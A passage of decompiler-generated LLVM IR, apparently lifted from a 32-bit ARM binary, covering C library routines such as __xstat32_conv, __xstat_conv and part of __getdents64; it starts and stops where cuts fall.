  %v3_1b438 = inttoptr i32 %v2_1b438 to i32*
  store i32 %v0_1b438, i32* %v3_1b438, align 4
  %v0_1b43c = load i32, i32* %r3.global-to-local, align 4
  %v1_1b43c = inttoptr i32 %v0_1b43c to i32*
  store i32 %v2_1b418, i32* %v1_1b43c, align 4
  %v3_1b43c = add i32 %v0_1b43c, 4
  %v4_1b43c = inttoptr i32 %v3_1b43c to i32*
  %v5_1b43c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1b43c, i32* %v4_1b43c, align 4
  %v2_1b440 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1b440, i32* %r4.global-to-local, align 4
  ret i32 %v2_1b418

; uselistorder directives
  uselistorder i32 %v0_1b410, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_1b3e8, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 100, { 9, 0, 1, 2, 3, 4, 5, 6, 7, 8, 10 }
  uselistorder i32 104, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1b448 = load i32, i32* @r4, align 4
  store i32 %v3_1b448, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_1b460 = inttoptr i32 %arg2 to i8*
  %v3_1b460 = call i32 @__GI_memset(i8* %v2_1b460, i32 0)
  %v2_1b464 = load i32, i32* %arg1, align 4
  %v3_1b464 = add i32 %tmp, 4
  %v4_1b464 = inttoptr i32 %v3_1b464 to i32*
  %v5_1b464 = load i32, i32* %v4_1b464, align 4
  store i32 %v5_1b464, i32* %r4.global-to-local, align 4
  %v0_1b468 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b468 = inttoptr i32 %v0_1b468 to i32*
  store i32 %v2_1b464, i32* %v1_1b468, align 4
  %v3_1b468 = add i32 %v0_1b468, 4
  %v4_1b468 = inttoptr i32 %v3_1b468 to i32*
  %v5_1b468 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b468, i32* %v4_1b468, align 4
  %v0_1b46c = load i32, i32* %r5.global-to-local, align 4
  %v1_1b46c = add i32 %v0_1b46c, 32
  %v1_1b470 = inttoptr i32 %v1_1b46c to i32*
  %v2_1b470 = load i32, i32* %v1_1b470, align 4
  %v3_1b470 = add i32 %v0_1b46c, 36
  %v4_1b470 = inttoptr i32 %v3_1b470 to i32*
  %v5_1b470 = load i32, i32* %v4_1b470, align 4
  store i32 %v5_1b470, i32* %r4.global-to-local, align 4
  %v1_1b474 = add i32 %v0_1b46c, 96
  %v2_1b474 = inttoptr i32 %v1_1b474 to i32*
  %v3_1b474 = load i32, i32* %v2_1b474, align 4
  store i32 %v3_1b474, i32* %r2.global-to-local, align 4
  %v1_1b478 = load i32, i32* %r6.global-to-local, align 4
  %v2_1b478 = add i32 %v1_1b478, 32
  %v3_1b478 = inttoptr i32 %v2_1b478 to i32*
  store i32 %v2_1b470, i32* %v3_1b478, align 4
  %v0_1b47c = load i32, i32* %r4.global-to-local, align 4
  %v1_1b47c = load i32, i32* %r6.global-to-local, align 4
  %v2_1b47c = add i32 %v1_1b47c, 36
  %v3_1b47c = inttoptr i32 %v2_1b47c to i32*
  store i32 %v0_1b47c, i32* %v3_1b47c, align 4
  %v0_1b480 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b480 = load i32, i32* %r6.global-to-local, align 4
  %v2_1b480 = add i32 %v1_1b480, 12
  %v3_1b480 = inttoptr i32 %v2_1b480 to i32*
  store i32 %v0_1b480, i32* %v3_1b480, align 4
  %v0_1b484 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b484 = add i32 %v0_1b484, 48
  %v2_1b484 = inttoptr i32 %v1_1b484 to i32*
  %v3_1b484 = load i32, i32* %v2_1b484, align 4
  %v1_1b488 = add i32 %v0_1b484, 24
  store i32 %v1_1b488, i32* %ip.global-to-local, align 4
  %v1_1b48c = inttoptr i32 %v1_1b488 to i32*
  %v2_1b48c = load i32, i32* %v1_1b48c, align 4
  store i32 %v2_1b48c, i32* %ip.global-to-local, align 4
  %v3_1b48c = add i32 %v0_1b484, 28
  %v4_1b48c = inttoptr i32 %v3_1b48c to i32*
  %v5_1b48c = load i32, i32* %v4_1b48c, align 4
  store i32 %v5_1b48c, i32* %lr.global-to-local, align 4
  %v1_1b490 = load i32, i32* %r6.global-to-local, align 4
  %v2_1b490 = add i32 %v1_1b490, 44
  %v3_1b490 = inttoptr i32 %v2_1b490 to i32*
  store i32 %v3_1b484, i32* %v3_1b490, align 4
  %v0_1b494 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b494 = add i32 %v0_1b494, 64
  %v2_1b494 = inttoptr i32 %v1_1b494 to i32*
  %v3_1b494 = load i32, i32* %v2_1b494, align 4
  %v1_1b498 = add i32 %v0_1b494, 56
  %v2_1b498 = inttoptr i32 %v1_1b498 to i32*
  %v3_1b498 = load i32, i32* %v2_1b498, align 4
  store i32 %v3_1b498, i32* %r2.global-to-local, align 4
  %v1_1b49c = load i32, i32* %r6.global-to-local, align 4
  %v2_1b49c = add i32 %v1_1b49c, 52
  %v3_1b49c = inttoptr i32 %v2_1b49c to i32*
  store i32 %v3_1b494, i32* %v3_1b49c, align 4
  %v0_1b4a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b4a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1b4a0 = add i32 %v1_1b4a0, 48
  %v3_1b4a0 = inttoptr i32 %v2_1b4a0 to i32*
  store i32 %v0_1b4a0, i32* %v3_1b4a0, align 4
  %v0_1b4a4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b4a4 = add i32 %v0_1b4a4, 72
  %v1_1b4a8 = inttoptr i32 %v1_1b4a4 to i32*
  %v2_1b4a8 = load i32, i32* %v1_1b4a8, align 4
  %v3_1b4a8 = add i32 %v0_1b4a4, 76
  %v4_1b4a8 = inttoptr i32 %v3_1b4a8 to i32*
  %v5_1b4a8 = load i32, i32* %v4_1b4a8, align 4
  store i32 %v5_1b4a8, i32* %r1.global-to-local, align 4
  %v0_1b4ac = load i32, i32* %r6.global-to-local, align 4
  %v1_1b4ac = add i32 %v0_1b4ac, 56
  %v1_1b4b0 = inttoptr i32 %v1_1b4ac to i32*
  store i32 %v2_1b4a8, i32* %v1_1b4b0, align 4
  %v3_1b4b0 = add i32 %v0_1b4ac, 60
  %v4_1b4b0 = inttoptr i32 %v3_1b4b0 to i32*
  %v5_1b4b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1b4b0, i32* %v4_1b4b0, align 4
  %v0_1b4b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b4b4 = add i32 %v0_1b4b4, 80
  %v1_1b4b8 = inttoptr i32 %v1_1b4b4 to i32*
  %v2_1b4b8 = load i32, i32* %v1_1b4b8, align 4
  %v3_1b4b8 = add i32 %v0_1b4b4, 84
  %v4_1b4b8 = inttoptr i32 %v3_1b4b8 to i32*
  %v5_1b4b8 = load i32, i32* %v4_1b4b8, align 4
  store i32 %v5_1b4b8, i32* %r1.global-to-local, align 4
  %v0_1b4bc = load i32, i32* %r6.global-to-local, align 4
  %v1_1b4bc = add i32 %v0_1b4bc, 64
  %v1_1b4c0 = inttoptr i32 %v1_1b4bc to i32*
  store i32 %v2_1b4b8, i32* %v1_1b4c0, align 4
  %v3_1b4c0 = add i32 %v0_1b4bc, 68
  %v4_1b4c0 = inttoptr i32 %v3_1b4c0 to i32*
  %v5_1b4c0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1b4c0, i32* %v4_1b4c0, align 4
  %v0_1b4c4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b4c4 = add i32 %v0_1b4c4, 16
  %v2_1b4c4 = inttoptr i32 %v1_1b4c4 to i32*
  %v3_1b4c4 = load i32, i32* %v2_1b4c4, align 4
  %v1_1b4c8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1b4c8 = add i32 %v1_1b4c8, 16
  %v3_1b4c8 = inttoptr i32 %v2_1b4c8 to i32*
  store i32 %v3_1b4c4, i32* %v3_1b4c8, align 4
  %v0_1b4cc = load i32, i32* %r5.global-to-local, align 4
  %v1_1b4cc = add i32 %v0_1b4cc, 88
  %v1_1b4d0 = add i32 %v0_1b4cc, 20
  %v2_1b4d0 = inttoptr i32 %v1_1b4d0 to i32*
  %v3_1b4d0 = load i32, i32* %v2_1b4d0, align 4
  store i32 %v3_1b4d0, i32* %r2.global-to-local, align 4
  %v1_1b4d4 = inttoptr i32 %v1_1b4cc to i32*
  %v2_1b4d4 = load i32, i32* %v1_1b4d4, align 4
  %v3_1b4d4 = add i32 %v0_1b4cc, 92
  %v4_1b4d4 = inttoptr i32 %v3_1b4d4 to i32*
  %v5_1b4d4 = load i32, i32* %v4_1b4d4, align 4
  store i32 %v5_1b4d4, i32* %r1.global-to-local, align 4
  %v0_1b4d8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b4d8 = add i32 %v0_1b4d8, 72
  %v1_1b4dc = inttoptr i32 %v1_1b4d8 to i32*
  store i32 %v2_1b4d4, i32* %v1_1b4dc, align 4
  %v3_1b4dc = add i32 %v0_1b4d8, 76
  %v4_1b4dc = inttoptr i32 %v3_1b4dc to i32*
  %v5_1b4dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1b4dc, i32* %v4_1b4dc, align 4
  %v0_1b4e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b4e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1b4e0 = add i32 %v1_1b4e0, 20
  %v3_1b4e0 = inttoptr i32 %v2_1b4e0 to i32*
  store i32 %v0_1b4e0, i32* %v3_1b4e0, align 4
  %v0_1b4e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1b4e4 = load i32, i32* %r6.global-to-local, align 4
  %v2_1b4e4 = add i32 %v1_1b4e4, 24
  %v3_1b4e4 = inttoptr i32 %v2_1b4e4 to i32*
  store i32 %v0_1b4e4, i32* %v3_1b4e4, align 4
  %v0_1b4e8 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b4e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_1b4e8 = add i32 %v1_1b4e8, 28
  %v3_1b4e8 = inttoptr i32 %v2_1b4e8 to i32*
  store i32 %v0_1b4e8, i32* %v3_1b4e8, align 4
  %v2_1b4ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1b4ec, i32* %r4.global-to-local, align 4
  ret i32 %v2_1b4d4

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 92, { 0, 1, 3, 2, 4 }
  uselistorder i32 84, { 1, 2, 0, 3, 4, 5, 6 }
  uselistorder i32 80, { 1, 2, 3, 4, 5, 6, 0, 7, 8 }
  uselistorder i32 96, { 4, 5, 6, 7, 8, 1, 2, 0, 3, 9 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_1b510 = inttoptr i32 %arg2 to i8*
  %v3_1b510 = call i32 @__GI_memset(i8* %v2_1b510, i32 0)
  %v1_1b514 = add i32 %tmp, 4
  %v2_1b514 = inttoptr i32 %v1_1b514 to i32*
  %v3_1b514 = load i32, i32* %v2_1b514, align 4
  %v2_1b518 = load i32, i32* %arg1, align 4
  store i32 %v2_1b518, i32* %r8.global-to-local, align 4
  %v1_1b51c = load i32, i32* %r5.global-to-local, align 4
  %v2_1b51c = add i32 %v1_1b51c, 12
  %v3_1b51c = inttoptr i32 %v2_1b51c to i32*
  store i32 %v3_1b514, i32* %v3_1b51c, align 4
  %v0_1b520 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b520 = add i32 %v0_1b520, 20
  %v2_1b520 = inttoptr i32 %v1_1b520 to i32*
  %v3_1b520 = load i32, i32* %v2_1b520, align 4
  %v1_1b524 = add i32 %v0_1b520, 16
  %v2_1b524 = inttoptr i32 %v1_1b524 to i32*
  %v3_1b524 = load i32, i32* %v2_1b524, align 4
  store i32 %v3_1b524, i32* %r6.global-to-local, align 4
  %v1_1b528 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b528 = add i32 %v1_1b528, 44
  %v3_1b528 = inttoptr i32 %v2_1b528 to i32*
  store i32 %v3_1b520, i32* %v3_1b528, align 4
  %v0_1b52c = load i32, i32* %r4.global-to-local, align 4
  %v1_1b52c = add i32 %v0_1b52c, 24
  %v2_1b52c = inttoptr i32 %v1_1b52c to i32*
  %v3_1b52c = load i32, i32* %v2_1b52c, align 4
  %v1_1b530 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b530 = add i32 %v1_1b530, 48
  %v3_1b530 = inttoptr i32 %v2_1b530 to i32*
  store i32 %v3_1b52c, i32* %v3_1b530, align 4
  %v0_1b534 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b534 = add i32 %v0_1b534, 28
  %v2_1b534 = inttoptr i32 %v1_1b534 to i32*
  %v3_1b534 = load i32, i32* %v2_1b534, align 4
  %v1_1b538 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b538 = add i32 %v1_1b538, 52
  %v3_1b538 = inttoptr i32 %v2_1b538 to i32*
  store i32 %v3_1b534, i32* %v3_1b538, align 4
  %v0_1b53c = load i32, i32* %r4.global-to-local, align 4
  %v1_1b53c = add i32 %v0_1b53c, 32
  %v1_1b540 = inttoptr i32 %v1_1b53c to i32*
  %v2_1b540 = load i32, i32* %v1_1b540, align 4
  %v3_1b540 = add i32 %v0_1b53c, 36
  %v4_1b540 = inttoptr i32 %v3_1b540 to i32*
  %v5_1b540 = load i32, i32* %v4_1b540, align 4
  store i32 %v5_1b540, i32* %r1.global-to-local, align 4
  %v0_1b544 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b544 = add i32 %v0_1b544, 56
  %v1_1b548 = inttoptr i32 %v1_1b544 to i32*
  store i32 %v2_1b540, i32* %v1_1b548, align 4
  %v3_1b548 = add i32 %v0_1b544, 60
  %v4_1b548 = inttoptr i32 %v3_1b548 to i32*
  %v5_1b548 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1b548, i32* %v4_1b548, align 4
  %v0_1b54c = load i32, i32* %r4.global-to-local, align 4
  %v1_1b54c = add i32 %v0_1b54c, 40
  %v1_1b550 = inttoptr i32 %v1_1b54c to i32*
  %v2_1b550 = load i32, i32* %v1_1b550, align 4
  %v3_1b550 = add i32 %v0_1b54c, 44
  %v4_1b550 = inttoptr i32 %v3_1b550 to i32*
  %v5_1b550 = load i32, i32* %v4_1b550, align 4
  store i32 %v5_1b550, i32* %r1.global-to-local, align 4
  %v0_1b554 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b554 = add i32 %v0_1b554, 64
  %v1_1b558 = inttoptr i32 %v1_1b554 to i32*
  store i32 %v2_1b550, i32* %v1_1b558, align 4
  %v3_1b558 = add i32 %v0_1b554, 68
  %v4_1b558 = inttoptr i32 %v3_1b558 to i32*
  %v5_1b558 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1b558, i32* %v4_1b558, align 4
  %v0_1b55c = load i32, i32* %r4.global-to-local, align 4
  %v1_1b55c = add i32 %v0_1b55c, 48
  %v1_1b560 = inttoptr i32 %v1_1b55c to i32*
  %v2_1b560 = load i32, i32* %v1_1b560, align 4
  %v3_1b560 = add i32 %v0_1b55c, 52
  %v4_1b560 = inttoptr i32 %v3_1b560 to i32*
  %v5_1b560 = load i32, i32* %v4_1b560, align 4
  store i32 %v5_1b560, i32* %r1.global-to-local, align 4
  %v1_1b564 = add i32 %v0_1b55c, 8
  %v2_1b564 = inttoptr i32 %v1_1b564 to i16*
  %v3_1b564 = load i16, i16* %v2_1b564, align 2
  %v4_1b564 = zext i16 %v3_1b564 to i32
  store i32 %v4_1b564, i32* %r2.global-to-local, align 4
  %v1_1b568 = add i32 %v0_1b55c, 10
  %v2_1b568 = inttoptr i32 %v1_1b568 to i16*
  %v3_1b568 = load i16, i16* %v2_1b568, align 2
  %v4_1b568 = zext i16 %v3_1b568 to i32
  store i32 %v4_1b568, i32* %ip.global-to-local, align 4
  %v1_1b56c = add i32 %v0_1b55c, 12
  %v2_1b56c = inttoptr i32 %v1_1b56c to i16*
  %v3_1b56c = load i16, i16* %v2_1b56c, align 2
  %v4_1b56c = zext i16 %v3_1b56c to i32
  store i32 %v4_1b56c, i32* %lr.global-to-local, align 4
  %v1_1b570 = add i32 %v0_1b55c, 14
  %v2_1b570 = inttoptr i32 %v1_1b570 to i16*
  %v3_1b570 = load i16, i16* %v2_1b570, align 2
  %v4_1b570 = zext i16 %v3_1b570 to i32
  store i32 %v4_1b570, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1b57c = load i32, i32* %r5.global-to-local, align 4
  %v1_1b57c = add i32 %v0_1b57c, 72
  %v1_1b580 = inttoptr i32 %v1_1b57c to i32*
  store i32 %v2_1b560, i32* %v1_1b580, align 4
  %v3_1b580 = add i32 %v0_1b57c, 76
  %v4_1b580 = inttoptr i32 %v3_1b580 to i32*
  %v5_1b580 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1b580, i32* %v4_1b580, align 4
  %v0_1b584 = load i32, i32* %r5.global-to-local, align 4
  %v1_1b584 = inttoptr i32 %v0_1b584 to i32*
  %v2_1b584 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_1b584, i32* %v1_1b584, align 4
  %v3_1b584 = add i32 %v0_1b584, 4
  %v4_1b584 = inttoptr i32 %v3_1b584 to i32*
  %v5_1b584 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_1b584, i32* %v4_1b584, align 4
  %v0_1b588 = load i32, i32* %r6.global-to-local, align 4
  %v1_1b588 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b588 = add i32 %v1_1b588, 32
  %v3_1b588 = inttoptr i32 %v2_1b588 to i32*
  store i32 %v0_1b588, i32* %v3_1b588, align 4
  %v0_1b58c = load i32, i32* %r7.global-to-local, align 4
  %v1_1b58c = load i32, i32* %r5.global-to-local, align 4
  %v2_1b58c = add i32 %v1_1b58c, 36
  %v3_1b58c = inttoptr i32 %v2_1b58c to i32*
  store i32 %v0_1b58c, i32* %v3_1b58c, align 4
  %v0_1b590 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b590 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b590 = add i32 %v1_1b590, 16
  %v3_1b590 = inttoptr i32 %v2_1b590 to i32*
  store i32 %v0_1b590, i32* %v3_1b590, align 4
  %v0_1b594 = load i32, i32* %ip.global-to-local, align 4
  %v1_1b594 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b594 = add i32 %v1_1b594, 20
  %v3_1b594 = inttoptr i32 %v2_1b594 to i32*
  store i32 %v0_1b594, i32* %v3_1b594, align 4
  %v0_1b598 = load i32, i32* %lr.global-to-local, align 4
  %v1_1b598 = load i32, i32* %r5.global-to-local, align 4
  %v2_1b598 = add i32 %v1_1b598, 24
  %v3_1b598 = inttoptr i32 %v2_1b598 to i32*
  store i32 %v0_1b598, i32* %v3_1b598, align 4
  %v0_1b59c = load i32, i32* %r4.global-to-local, align 4
  %v1_1b59c = load i32, i32* %r5.global-to-local, align 4
  %v2_1b59c = add i32 %v1_1b59c, 28
  %v3_1b59c = inttoptr i32 %v2_1b59c to i32*
  store i32 %v0_1b59c, i32* %v3_1b59c, align 4
  ret i32 %v2_1b560

; uselistorder directives
  uselistorder i32 %v0_1b55c, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 72, { 10, 4, 5, 6, 7, 0, 12, 1, 2, 3, 8, 9, 11 }
  uselistorder i32 68, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 60, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 88, { 4, 0, 1, 2, 3, 5 }
}

define i32 @__getdents64(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1b5b0 = load i32, i32* @r4, align 4
  %v6_1b5b0 = load i32, i32* @r5, align 4
  %v12_1b5b0 = load i32, i32* @r7, align 4
  %v1_1b5b4 = add i32 %arg3, 14
  %v2_1b5bc = ptrtoint i32* %stack_var_-72 to i32
  %v1_1b5c0 = and i32 %v1_1b5b4, -8
  %v2_1b5c4 = sub i32 %v2_1b5bc, %v1_1b5c0
  %v1_1b5c8 = add i32 %v2_1b5c4, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_1b5c8, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_1b604, label %dec_label_pc_1b5f0

dec_label_pc_1b5f0:                               ; preds = %entry
  %v0_1b5f0 = call i32 @__GI___errno_location()
  %v0_1b5f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1b5f4 = sub i32 0, %v0_1b5f4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1b5fc = inttoptr i32 %v0_1b5f0 to i32*
  store i32 %v1_1b5f4, i32* %v2_1b5fc, align 4
  %v0_1b60c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1b60c

dec_label_pc_1b604:                               ; preds = %entry
  br i1 false, label %dec_label_pc_1b60c, label %dec_label_pc_1b614

dec_label_pc_1b60c:                               ; preds = %dec_label_pc_1b604, %dec_label_pc_1b5f0
  %v0_1b60c = phi i32 [ -1, %dec_label_pc_1b604 ], [ %v0_1b60c.pre, %dec_label_pc_1b5f0 ]
  store i32 %v0_1b60c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b6e0

dec_label_pc_1b614:                               ; preds = %dec_label_pc_1b604
  %v2_1b614 = add i32 %v1_1b5c8, %arg1
  %v2_1b618 = add i32 %tmp, %arg3
  store i32 %v2_1b618, i32* @ip, align 4
  store i32 %v1_1b5c8, i32* @r7, align 4
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1b6c8

dec_label_pc_1b634:                               ; preds = %dec_label_pc_1b6c8
  %v1_1b634 = add i32 %v0_1b688, 16
  %v2_1b634 = inttoptr i32 %v1_1b634 to i16*
  %v3_1b634 = load i16, i16* %v2_1b634, align 2
  %v4_1b634 = zext i16 %v3_1b634 to i32
  %v1_1b638 = add nuw nsw i32 %v4_1b634, 7
  %v1_1b63c = and i32 %v1_1b638, 131064
  store i32 %v1_1b63c, i32* %r2.global-to-local, align 4
  %v2_1b644 = add i32 %v1_1b63c, %v0_1b690
  store i32 %v2_1b644, i32* %r8.global-to-local, align 4
  %tmp26 = icmp ugt i32 %v2_1b644, %v2_1b618
  br i1 %tmp26, label %dec_label_pc_1b650, label %dec_label_pc_1b684

dec_label_pc_1b650:                               ; preds = %dec_label_pc_1b634
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1b658 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1b658, i32* %r2.global-to-local, align 4
  %v0_1b65c = load i32, i32* %sl.global-to-local, align 4
  %v1_1b660 = load i32, i32* @sp, align 4
  %v2_1b660 = inttoptr i32 %v1_1b660 to i32*
  store i32 0, i32* %v2_1b660, align 4
  %v4_1b664 = call i32 @__GI_lseek64(i32 %arg1, i32 0, i32 %v0_1b658, i32 %v0_1b65c)
  %v0_1b668 = load i32, i32* @r5, align 4
  %v1_1b668 = load i32, i32* %r6.global-to-local, align 4
  %v9_1b668 = icmp eq i32 %v0_1b668, %v1_1b668
  br i1 %v9_1b668, label %dec_label_pc_1b670, label %dec_label_pc_1b6dc

dec_label_pc_1b670:                               ; preds = %dec_label_pc_1b650
  %v0_1b670 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r1.global-to-local, align 4
  %v2_1b67c = inttoptr i32 %v0_1b670 to i32*
  store i32 22, i32* %v2_1b67c, align 4
  %v0_1b6e0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1b6e0

dec_label_pc_1b684:                               ; preds = %dec_label_pc_1b634
  %v1_1b684 = inttoptr i32 %v0_1b688 to i32*
  %v2_1b684 = load i32, i32* %v1_1b684, align 4
  %v3_1b684 = add i32 %v0_1b688, 4
  %v4_1b684 = inttoptr i32 %v3_1b684 to i32*
  %v5_1b684 = load i32, i32* %v4_1b684, align 4
  store i32 %v5_1b684, i32* %r4.global-to-local, align 4
  %v1_1b688 = add i32 %v0_1b688, 8
  store i32 %v1_1b688, i32* %sb.global-to-local, align 4
  %v1_1b68c = inttoptr i32 %v1_1b688 to i32*
  %v2_1b68c = load i32, i32* %v1_1b68c, align 4
  store i32 %v2_1b68c, i32* %sb.global-to-local, align 4
  %v3_1b68c = add i32 %v0_1b688, 12
  %v4_1b68c = inttoptr i32 %v3_1b68c to i32*
  %v5_1b68c = load i32, i32* %v4_1b68c, align 4
  store i32 %v5_1b68c, i32* %sl.global-to-local, align 4
  %v1_1b690 = inttoptr i32 %v0_1b690 to i32*
  store i32 %v2_1b684, i32* %v1_1b690, align 4
  %v3_1b690 = add i32 %v0_1b690, 4
  %v4_1b690 = inttoptr i32 %v3_1b690 to i32*
  %v5_1b690 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1b690, i32* %v4_1b690, align 4
  %v0_1b694 = load i32, i32* @r7, align 4
  %v1_1b694 = add i32 %v0_1b694, 8
  %v1_1b698 = inttoptr i32 %v1_1b694 to i32*
  %v2_1b698 = load i32, i32* %v1_1b698, align 4
  %v3_1b698 = add i32 %v0_1b694, 12
  %v4_1b698 = inttoptr i32 %v3_1b698 to i32*
  %v5_1b698 = load i32, i32* %v4_1b698, align 4
  store i32 %v5_1b698, i32* @r4, align 4
  %v1_1b69c = load i32, i32* @r5, align 4
  %v2_1b69c = add i32 %v1_1b69c, 8
  %v3_1b69c = inttoptr i32 %v2_1b69c to i32*
  store i32 %v2_1b698, i32* %v3_1b69c, align 4
  %v0_1b6a0 = load i32, i32* @r4, align 4
  %v1_1b6a0 = load i32, i32* @r5, align 4
  %v2_1b6a0 = add i32 %v1_1b6a0, 12
  %v3_1b6a0 = inttoptr i32 %v2_1b6a0 to i32*
  store i32 %v0_1b6a0, i32* %v3_1b6a0, align 4
  %v0_1b6a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1b6a4 = trunc i32 %v0_1b6a4 to i16
  %v2_1b6a4 = load i32, i32* @r5, align 4
  %v3_1b6a4 = add i32 %v2_1b6a4, 16
  %v4_1b6a4 = inttoptr i32 %v3_1b6a4 to i16*
  store i16 %v1_1b6a4, i16* %v4_1b6a4, align 2
  %v0_1b6a8 = load i32, i32* @r7, align 4
  %v1_1b6a8 = add i32 %v0_1b6a8, 18
  %v2_1b6a8 = inttoptr i32 %v1_1b6a8 to i8*
  %v3_1b6a8 = load i8, i8* %v2_1b6a8, align 1
  %v4_1b6a8 = zext i8 %v3_1b6a8 to i32
  store i32 %v4_1b6a8, i32* @r3, align 4
  %v2_1b6ac = load i32, i32* @r5, align 4
  %v3_1b6ac = add i32 %v2_1b6ac, 18
  %v4_1b6ac = inttoptr i32 %v3_1b6ac to i8*
  store i8 %v3_1b6a8, i8* %v4_1b6ac, align 1
  %v0_1b6b0 = load i32, i32* @r7, align 4
  %v1_1b6b0 = add i32 %v0_1b6b0, 16
